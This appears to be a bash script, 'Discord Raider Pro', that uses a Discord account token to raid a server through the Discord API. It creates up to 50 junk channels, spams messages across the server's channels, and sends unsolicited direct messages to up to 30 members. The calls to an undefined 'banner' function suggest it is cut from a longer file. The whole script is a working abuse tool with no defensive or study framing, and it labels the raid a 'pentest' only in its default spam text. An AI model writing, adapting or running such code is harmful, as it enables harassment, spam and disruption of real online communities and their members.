banner

echo "🔥 WELCOME TO DISCORD RAIDER PRO 🔥"
echo "══════════════════════════════════════════════════════════════════════"
echo

read -p "🎭  Enter your Discord TOKEN: " TOKEN
echo -e "\n$(printf '=%.0s' {1..60})"
read -p "🔗  Enter SERVER/GUILD ID: " GUILD_ID
echo -e "\n$(printf '=%.0s' {1..60})"
read -p "📊  Number of CHANNELS (default 50): " CHANNELS
read -p "💬  SPAM MESSAGE (default PENTEST): " SPAM_MSG
echo -e "\n$(printf '=%.0s' {1..60})"

CHANNELS=${CHANNELS:-50}
SPAM_MSG=${SPAM_MSG:-"🔥 SERVER PENTEST IN PROGRESS 🔥"}

banner
echo "🎮 CONFIGURATION:"
echo "   📍 Server: $GUILD_ID"
echo "   📁 Channels: $CHANNELS" 
echo "   💣 Message: $SPAM_MSG"
echo "   🔑 Token: ${TOKEN:0:15}..."
echo -e "\n$(printf '=%.0s' {1..60})"
read -p "⚡ PRESS ENTER TO LAUNCH RAID... "

# VALIDATE
clear
echo "🔍 TESTING TOKEN..."
if ! curl -s -H "Authorization: $TOKEN" https://discord.com/api/v9/users/@me | grep -q '"id"'; then
    echo "❌ INVALID TOKEN!"
    exit 1
fi

banner
echo "🚀 RAID PHASES INITIATED 🚀"

# PHASE 1: CHANNEL FLOOD
echo -e "\n📁 PHASE 1/3: CREATING $CHANNELS CHANNELS..."
for i in $(seq 1 $CHANNELS); do
    curl -s -X POST "https://discord.com/api/v9/guilds/$GUILD_ID/channels" \
        -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
        -d "{\"name\":\"raid_$i_$(date +%s%N | cut -c1-8)\",\"type\":0}" > /dev/null
    printf "\r📁 [%3d/%d] Channels flooded" $i $CHANNELS
    sleep 0.1
done

# PHASE 2: SPAM BLAST
echo -e "\n\n💥 PHASE 2/3: SPAMMING ALL CHANNELS..."
curl -s -H "Authorization: $TOKEN" "https://discord.com/api/v9/guilds/$GUILD_ID/channels" | \
grep -o '"id":"[^"]*' | cut -d'"' -f4 | head -50 | while read ch; do
    for m in {1..3}; do
        curl -s -X POST "https://discord.com/api/v9/channels/$ch/messages" \
            -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
            -d "{\"content\":\"$SPAM_MSG #$m\"}" > /dev/null 2>&1
    done
    printf "\r💥 [%s] Spammed" "${ch:0:8}"
    sleep 0.15
done

# PHASE 3: DM RAID
echo -e "\n\n📨 PHASE 3/3: DM BOMBER..."
curl -s -H "Authorization: $TOKEN" "https://discord.com/api/v9/guilds/$GUILD_ID/members?limit=200" | \
grep -o '"id":"[^"]*' | cut -d'"' -f4 | tail -n +2 | head -30 | while read user; do
    curl -s -X POST "https://discord.com/api/v9/users/@me/channels" \
        -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
        -d "{\"recipient_id\":\"$user\"}" | grep -o '"id":"[^"]*' | head -1 | \
    cut -d'"' -f4 | while read dm; do [ -n "$dm" ] && curl -s -X POST "https://discord.com/api/v9/channels/$dm/messages" \
        -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
        -d "{\"content\":\"$SPAM_MSG - DM ATTACK\"}" > /dev/null 2>&1; done
    printf "\r📨 [%s] DM'd" "${user:0:8}"
    sleep 0.2
done

banner
echo " RAID COMPLETE! "
echo " Server Raided. "
